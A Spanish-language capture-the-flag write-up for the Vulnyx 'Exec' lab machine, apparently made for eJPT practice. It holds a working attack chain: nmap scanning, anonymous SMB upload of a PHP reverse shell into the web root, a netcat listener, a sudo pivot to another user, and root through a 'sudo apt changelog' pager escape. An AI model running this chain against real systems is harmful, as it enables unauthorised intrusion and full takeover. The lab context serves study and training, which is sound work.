# Exec

> 🧠 **Plataforma:** Vulnyx
>
> 💻 **Sistema operativo:** Linux
>
> 🎯 **Nivel:** Easy
>
> ✅ **Estado:** Done
>
> 📘 **Curso eJPT:** yes
>
> 🗓️ **Fecha de creación:** 6 de abril de 2025 20:42
>
> 🌐 **IP:** `192.168.0.187`

---


## Recopilación de información

<aside>
💡 Reconocimiento general

</aside>

Identificamos la maquina por la MAC perteneciente al fabricante VirtualBox (empieza por 08:00)

```bash
 whichSystem.py 192.168.0.187                                                                                                          
	192.168.0.187 (ttl -> 64): Linux
```

### **Escaneo de puertos**

Comenzamos con un escaneo para identificar que puertos están abiertos.

---

```bash
sudo nmap -p- --open -T5 -sS --min-rate 5000 -n -Pn -vvv 192.168.0.187-oG all_ports

PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack ttl 64
80/tcp  open  http         syn-ack ttl 64
139/tcp open  netbios-ssn  syn-ack ttl 64
445/tcp open  microsoft-ds syn-ack ttl 64
```

### **Enumeración de servicios**

Una vez listado los puertos accesibles, procederemos a realizar la enumeración de servicios para su posterior identificación de vulnerabilidades.

---

```bash
 sudo nmap -p22,80,139,445 -sCV 192.168.0.187 -oN targeted  

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 a9:a8:52:f3:cd:ec:0d:5b:5f:f3:af:5b:3c:db:76:b6 (ECDSA)
|_  256 73:f5:8e:44:0c:b9:0a:e0:e7:31:0c:04:ac:7e:ff:fd (ED25519)
80/tcp  open  http        Apache httpd 2.4.57 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.57 (Debian)
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
MAC Address: 08:00:27:4D:01:E3 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: -2s
| smb2-time: 
|   date: 2025-04-06T18:46:31
|_  start_date: N/A
|_nbstat: NetBIOS name: EXEC, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
```

- **Identificación de vulnerabilidades**
    - 22 OpenSSH 9.2p1
    - 80 Apche httpd 2.4.57
    - 445/139 SMB

Al tener abiertos los puertos 445/139 procedemos a enumerar el servicio SMB

Probamos a establecer una conexion remota anonima

```bash
smbclient -L 192.168.0.187  
Password: anonymous

Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	server          Disk      Developer Directory
	IPC$            IPC       IPC Service (Samba 4.17.12-Debian)
	nobody          Disk      Home Directories
```

## Explotación

<aside>
💡 Probamos diferentes accesos

</aside>

### SMBClient

Mediante el uso de SMBClient , tratamos de conectar al recurso sin credencia

```bash
smbclient //192.168.0.187/server -N
smb: \> ls
  .                                   D        0  Sun Apr  6 22:58:58 2025
  ..                                  D        0  Mon Apr 15 10:04:12 2024
  index.html                          N    10701  Mon Apr 15 10:04:31 2024

		19480400 blocks of size 1024. 16400548 blocks available
```

Vemos que el acceso es posible y observamos que estamos en la raiz del servidor que aloja la pagina web (apache)

Tratamos de subir una rever shell para ejecutarla desde la web

Usamos la revershell de PentestMonkey como shell.php

```bash
nano shell.php 

smb: \> put shell.php
smb: \> ls
  .                                   D        0  Sun Apr  6 23:05:16 2025
  ..                                  D        0  Mon Apr 15 10:04:12 2024
  shell.php                           A     2587  Sun Apr  6 23:05:16 2025
  index.html                          N    10701  Mon Apr 15 10:04:31 2024

```

Nos ponemos en escucha para recibir la revershell

```bash
nc -lvnp 4444
```

Accedemos al servidor web y ejecutamos

```bash
http:\\192.168.0.187\shell.php
```

Obtenemos acceso y hacemos tratamiento de la TTY

```bash
www-data@exec:/$
cntrZ
stty raw -echo; fg
	reset xterm
www-data@exec:/$ export SHELL = BASH
www-data@exec:/$ export TERM = XTERM

```

### Explotación posterior

<aside>
💡 Accedemos con las credenciales encontradas

</aside>

Una vez dentro, listamos los permisos del usuario

```bash
sudo -l
Matching Defaults entries for www-data on exec:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User www-data may run the following commands on exec:
    (s3cur4) NOPASSWD: /usr/bin/bash

```

Vemos que podemos convertirnos en el usuario s3cur4 ejecutandouna bash sin requerir permisos

```bash
www-data@exec:/$ sudo -u s3cur4 /usr/bin/bash
s3cur4@exec:/$ 
```

### Escalada de privilegios

Ahora vamos a listar los permisos del usuario s3cur4

```bash
s3cur4@exec:/$ sudo -l
Matching Defaults entries for s3cur4 on exec:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User s3cur4 may run the following commands on exec:
    (root) NOPASSWD: /usr/bin/apt
```

Vemos que podemos ejecutar con privilegios de root el binario apt

Buscamos como explotar el binario(GTFObins)

```bash

This invokes the default pager, which is likely to be less, other functions may apply.

sudo apt changelog apt
!/bin/sh

```

Explotamos el binario

```bash
s3cur4@exec:/$ cd /usr/bin/
s3cur4@exec:/usr/bin$ sudo apt changelog apt
Get:1 https://metadata.ftp-master.debian.org apt 2.6.1 Changelog [505 kB]
Fetched 505 kB in 1s (723 kB/s)
WARNING: terminal is not fully functional
Press RETURN to continue 
!/bin/sh
# whoami
root
```